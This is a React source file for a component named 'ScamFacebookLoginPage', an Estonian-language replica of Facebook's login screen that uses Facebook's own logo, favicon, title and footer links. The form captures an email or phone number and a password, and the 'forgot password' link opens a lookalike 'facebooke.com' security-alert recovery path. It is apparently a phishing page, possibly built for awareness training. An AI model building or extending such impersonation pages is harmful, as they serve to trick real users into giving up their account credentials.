import React, { useState } from "react";
import { Box, Button, Flex, Input, Text, Image, Link } from "@chakra-ui/react";
import { Helmet, HelmetProvider } from "react-helmet-async";

const ScamFacebookLoginPage: React.FC = () => {
  const languages = [
    "Eesti",
    "Русский",
    "English (US)",
    "Suomi",
    "Deutsch",
    "Français (France)",
    "Italiano",
    "Español",
    "Svenska",
    "Português (Brasil)",
    "العربية",
  ];

  const footerLinks = [
    "Registreeru",
    "Logi sisse",
    "Messenger",
    "Facebook Lite",
    "Video",
    "Meta Pay",
    "Meta pood",
    "Meta Quest",
    "Ray-Ban",
    "Meta",
    "Meta AI",
    "Instagram",
    "Lõimed",
    "Hääletamise teabekeskus",
    "Privaatsuspõhimõtted",
    "Privaatsuskeskus",
    "Küpsiste seaded",
    "Teave",
    "Loo reklaam",
    "Loo leht",
    "Arendajad",
    "Tööpakkumised",
    "Küpsised",
    "Reklaamivalikud",
    "Tingimused",
    "Abi",
    "Kontaktide üleslaadimine ja mittekasutajad",
    "Seaded",
    "Tegevuslogi",
  ];

  const [username, setUsername] = useState<string>("");
  const [password, setPassword] = useState<string>("");
  const [error, setError] = useState<string | null>(null);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setError("Sisselogimine ebaõnnestus. Palun proovige uuesti.");
  };

  return (
    <>
      <HelmetProvider>
        <Helmet>
          <title>Facebook - logi sisse</title>
          <link
            rel="icon"
            href="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
          />
        </Helmet>
        <Flex direction="column" minH="100vh">
          {/* Main Content */}
          <Flex
            align="flex-start"
            justify="center"
            bg="gray.100"
            p={4}
            flex="1"
          >
            <Flex
              align="center"
              justify="space-between"
              maxW="1000px"
              w="100%"
              mt={28}
            >
              <Box flex="1" mt={-12}>
                <Image
                  src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg"
                  maxW="320px"
                ></Image>
                <Text fontWeight="" fontSize="3xl" ml={8} mb={4} lineHeight={1}>
                  Facebook aitab sul suhelda
                  <br /> lähedastega ja jagada oma elu.
                </Text>
              </Box>
              <Box
                bg="white"
                p={8}
                borderRadius="md"
                boxShadow="lg"
                maxW="400px"
                w="100%"
              >
                <Flex align="center" justify="center" mb={6}>
                  <form onSubmit={handleLogin}>
                    <Input
                      placeholder="Meiliaadress või telefoninumber"
                      mb={4}
                      size="lg"
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                    />
                    <Input
                      placeholder="Salasõna"
                      type="password"
                      mb={4}
                      size="lg"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                    />
                    {error && (
                      <Text color="red.500" mb={4}>
                        {error}
                      </Text>
                    )}
                    <Button type="submit" bg="#0866ff" w="100%" size="lg">
                      <Text textStyle="xl" fontWeight="semibold">
                        Logi sisse
                      </Text>
                    </Button>
                  </form>
                </Flex>
                <Flex justify="center">
                  <Link
                    color="blue.600"
                    target="_blank"
                    mt={2}
                    href="mailto:facebook.com/recover/initiate/context=Q7DVBAHu4mjUMkGURJPWF8C6M-6Q-pQtDrl"
                    onClick={(e) => {
                      e.preventDefault();
                      window.open(
                        "http://localhost:5173/facebooke.com/security-alert/recover-account/context=Q7DVBAHu4mjUMkGURJPWF8C6M-6Q-pQtDrlfa"
                      );
                    }}
                  >
                    Kas unustasid parooli?
                  </Link>
                </Flex>
              </Box>
            </Flex>
          </Flex>

          <Box
            textAlign="center"
            bg="white"
            p={4}
            width="100%"
            alignItems="center"
            flex="0 0 20%"
          >
            <Flex justify="center" width="100%">
              <Box width="50%">
                <Box>
                  <Text
                    fontSize="xs"
                    color="gray.500"
                    pb={3}
                    borderBottom="1px solid lightgray"
                    textAlign="left"
                  >
                    {languages.map((language, index) => (
                      <Box as="span" key={index} pr={3}>
                        {language}
                      </Box>
                    ))}
                  </Text>
                </Box>
                <Box pt={3} pb={3}>
                  <Text fontSize="xs" color="gray.500" pb={3} textAlign="left">
                    {footerLinks.map((link, index) => (
                      <Box as="span" key={index} pr={3}>
                        {link}
                      </Box>
                    ))}
                  </Text>
                </Box>
                <Box>
                  <Box as="span">
                    <Text
                      fontSize="xs"
                      color="gray.500"
                      pb={3}
                      textAlign="left"
                    >
                      Meta © 2025
                    </Text>
                  </Box>
                </Box>
              </Box>
            </Flex>
          </Box>
        </Flex>
      </HelmetProvider>
    </>
  );
};

export default ScamFacebookLoginPage;
